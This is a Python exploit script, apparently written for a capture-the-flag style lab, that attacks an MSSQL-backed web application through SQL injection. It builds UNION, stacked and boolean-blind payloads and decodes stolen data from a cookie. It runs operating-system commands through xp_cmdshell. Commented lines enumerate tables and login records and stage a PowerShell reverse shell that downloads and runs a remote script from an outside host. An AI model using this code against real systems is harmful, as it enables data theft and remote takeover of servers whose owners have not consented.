import yasqlit as ya
import re
from urllib.parse import unquote
from base64 import b64decode, b64encode

def pPayload(p):
    p = p.replace('"',"'")
    sqli = f'2 UNION SELECT 1,2,3,4,({p}),6-- -'
    return sqli

def pPayloadStacked(p):
    # EXEC xp_cmdshell should have " (it's already inside ' so avoid it)
    if 'INSERT INTO tmpconfig' not in p:
        p = p.replace('"',"'")
    sqli = f'2;{p};-- -'
    return sqli

def pResponse(res):
    cookies = res.headers['Set-Cookie']
    if 'Email' not in cookies: return None
    res = re.findall('Email=(.*?);', cookies)[0]
    res = unquote(res)
    res = b64decode(res).decode()
    return res


def pBoolPayload(p):
    p = p.replace('"', "'")
    p = p.replace('SELECT ', "", 1)
    sqli = f'2 OR {p}'
    return sqli

def boolPredicate(res):
    cookies = res.headers['Set-Cookie']
    flag = re.findall('Email=(.*?);', cookies)[0]
    if flag == '':
        return False
    else:
        return True

def rce(cmd):
    t = ya.Transport(payloadProcessor=pPayload, responseProcessor=boolPredicate, requestPath='req-view.txt')
    t.payloadProcessor = pPayloadStacked
    ya.mssqlShell(t, cmd)
    t.payloadProcessor = pPayload
    ya.mssqlExfilShell(t)

def pwn():
    # t = ya.Transport(payloadProcessor=pPayload, responseProcessor=pResponse, requestPath='request.txt')
    # res = t.send(ya.templates['mssql']['select']['version']) # Microsoft SQL Server 2014 - 12.0.2269.0 (X64) 
    # res = t.send(ya.templates['mssql']['select']['isShellEnabled']) # 1
    # res = t.send(ya.templates['mssql']['select']['user']) # web
    # res = t.send(ya.templates['mssql']['select']['database']) # web
    # print(res)

    # idx = 0
    # while True:
    #     # qry = ya.templates['mssql']['select']['tables'] # _logins, TEST1, TMPYU
    #     # qry = ya.templates['mssql']['select']['columns'].format(table='_logins') # _e, _l, _n, _p, _u, id
    #     # qry = ya.templates['mssql']['select']['columns'].format(table='TEST1') # ID, OUT
    #     # qry = ya.templates['mssql']['select']['columns'].format(table='TMPYU') # ID, OUT
    #     qry = 'SELECT _e FROM _logins' # admin@nowhere.com
    #     limit = ya.templates['mssql']['util']['limit'].format(count=1, offset=idx)
    #     res = t.send(f'{qry} {limit}')
    #     if res is None: break
    #     print(res)
    #     idx += 1
    
    # interactiveCli(rce)

    # REMEMBER: python -m http.server 80
    # p = subprocess.Popen('nc -lvp 443'.split(' '))
    # revshell = R"""c:\windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe "IEX(New-Object Net.WebClient).downloadString(''http://10.10.14.16/Invoke-PowerShellTcp.ps1'');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 443" """
    # rce(revshell)

    # p.communicate()
    
    # bool
    t = ya.Transport(payloadProcessor=pBoolPayload, predicate=boolPredicate, requestPath='req-verify.txt')
    ya.boolExfiltrate(t, 'SELECT @@version', 'mssql')




pwn()